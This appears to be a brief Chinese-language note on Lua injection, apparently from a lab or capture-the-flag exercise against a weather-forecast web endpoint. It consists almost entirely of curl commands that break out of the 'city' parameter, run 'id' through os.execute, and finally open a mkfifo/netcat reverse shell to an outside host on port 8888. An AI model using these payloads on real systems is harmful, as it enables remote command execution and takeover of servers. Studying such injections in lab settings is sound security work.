# lua注入

lua脚本常用来处理一些操作

```bash
curl -s  ”http://10.10.10.218/weather/forecast?city='“
curl -s "http://10.129.18.130/weather/forecast?city=')+--"
curl -s "http://10.129.18.130/weather/forecast?city=')+os.execute('id')+--"
curl -G --data-urlencode "city=') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.29 8888 >/tmp/f') --" 'http://10.129.18.130/weather/forecast' -s
```

‍
